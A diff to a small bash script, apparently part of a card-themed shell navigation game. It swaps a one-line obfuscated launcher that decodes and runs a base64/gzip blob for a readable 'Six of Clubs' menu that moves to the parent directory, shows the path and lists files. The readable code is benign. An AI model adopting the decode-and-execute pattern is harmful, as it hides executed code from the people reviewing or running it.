@@ -1,1 +1,82 @@
-bash -c "$(echo H4sICIJed2cAA1NpeF9vZl9DbHVicwDVVVFP2zAQfs+vOAoSZFIDpbCHVHuYOjTtgYEomoQ2KXKdg1gLdmWnLRXw33d20jShDcsYQ5qfWtv57u677z5vb+2PhdwfM5N43vDq49cPuz8O+v3vvUH//e2ud3EyOrkstg7ov7cNpyincK00ZAnCSNyBuoZhOh0bGDIde0bcReo64nYnuqW7ez7ce0CLp8i0+4U8UdBF6Ozc25CPndVuB9yKXmutQT/As6tW0PProS32qZohZMoRds40ygw+CY08U3rRHvvVKGmd9wvWRuzLRBjgJA5gaarmBhZqavm4rfAyyXmJS16oCXRNA59qd9KAnSrOMqFkAFcEypmkGEbBTODc4S4/XwGbTE95NtUIpGHCUgYbsCk1yWbihmUImBqcJ6gxeA1O/t9e9oJSzi2l3B77MIBRouYwLHq2Qj5nWfJ32P0AvllNrGOPSj28FPsoIOuTHFNgMoYLJDBpCXJO2X5txD4O4OROZH8A0xb7n2gwN3X3atRcfeQmMzcBGjuDKbFPdIGa2OkN87saWQxdN5WCY/5oMBrPnXwDhPSWBfV8Zx9RpqLCOgaD8vDQB0NCiorhpxskn8p533cGEZWmEK1MoXLtyLeGQn2NGLdZVs+OfUDqS2S4FpNa8Hd+UfMXOWOpiItqgkIYQt447yNtBEHQGYBJESfQox9PX84lKhrGvUf79p45tqAXNg6hV2elxeNLSEVOm3yYcqz3k8cQBJXOWtulb0DS4AoZws7eZB771X5SvtA1tq/dCXTONRpDnV/AT1zYqLqcFxt/yYv7fo2RGguH4XN24a0poAUXm6HCTYp+uzr74W+ty2uS84tqLmGfFJ5ScekbFHwUNvupV5vIpvI6+fcpxk/GrsykyCOfvRY5HYe5D4/cvHuV2W/Mwd53YSlmfjWAz0rF4wVuFUqyiAc2znrwXxfrKRWZCwAA | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Six of Clubs Card
+six_of_clubs_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                              Six of Clubs                               |"
+    echo "     |                      Move to the Parent Directory                       |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card allows you to move to the parent directory of your current   |"
+    echo "     |  location. You can also view the current directory structure or choose  |"
+    echo "     |  to navigate elsewhere.                                                 |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  1. Move to Parent Directory                                            |"
+    echo "     |  2. Show Current Directory Path                                         |"
+    echo "     |  3. View Current Directory Structure                                    |"
+    echo "     |  4. Cancel and Return to Menu                                           |"
+    echo "     |  5. Exit                                                                |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    echo "Scan a card or select an option:"
+    read -r choice
+    case $choice in
+        1) move_to_parent ;;
+        2) show_current_path ;;
+        3) view_directory_structure ;;
+        4) cancel_action ;;
+        5) exit_script ;;
+        *) echo "Invalid choice. Returning to menu..."; sleep 1; six_of_clubs_menu ;;
+    esac
+}
+
+# Option 1: Move to Parent Directory
+move_to_parent() {
+    clear
+    echo -e "${CYAN}Moving to the parent directory...${RESET}"
+    cd ..
+    echo "You are now in: $(pwd)"
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    six_of_clubs_menu
+}
+
+# Option 2: Show Current Directory Path
+show_current_path() {
+    clear
+    echo -e "${CYAN}Current Directory Path:${RESET}"
+    echo "$(pwd)"
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    six_of_clubs_menu
+}
+
+# Option 3: View Current Directory Structure
+view_directory_structure() {
+    clear
+    echo -e "${CYAN}Current Directory Structure:${RESET}"
+    ls -l
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    six_of_clubs_menu
+}
+
+# Option 4: Cancel and Return to Menu
+cancel_action() {
+    clear
+    echo "Cancelled. Returning to the menu."
+    sleep 1
+    six_of_clubs_menu
+}
+
+# Option 5: Exit Script
+exit_script() {
+    clear
+    echo "Exiting the script. Goodbye!"
+    exit 0
+}
+
+six_of_clubs_menu
